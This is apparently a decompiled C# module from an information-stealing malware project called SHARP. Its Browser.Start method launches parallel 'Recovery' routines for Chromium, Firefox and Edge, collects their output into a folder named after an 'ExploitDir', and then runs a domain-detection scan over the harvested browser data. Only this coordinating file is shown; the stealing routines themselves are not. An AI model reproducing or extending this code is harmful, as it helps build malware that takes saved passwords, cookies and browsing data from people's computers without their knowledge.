﻿using System;
using System.Collections.Generic;
using System.Threading;
using SHARP.Chromium;
using SHARP.Edge;
using SHARP.Firefox;

namespace SHARP
{
	// Token: 0x02000019 RID: 25
	internal class Browser
	{
		// Token: 0x06000092 RID: 146 RVA: 0x000043B8 File Offset: 0x000025B8
		public static void Start()
		{
			string zxczxc = Help.ExploitDir;
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread(delegate()
				{
					SHARP.Chromium.Recovery.Run(zxczxc + "\\Browsers");
				}));
				list.Add(new Thread(delegate()
				{
					SHARP.Firefox.Recovery.Run(zxczxc + "\\Browsers");
				}));
				list.Add(new Thread(delegate()
				{
					SHARP.Edge.Recovery.Run(zxczxc + "\\Browsers");
				}));
				foreach (Thread thread in list)
				{
					thread.Start();
				}
				foreach (Thread thread2 in list)
				{
					thread2.Join();
				}
				URLSearcher.GetDomainDetect(zxczxc + "\\Browsers\\");
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
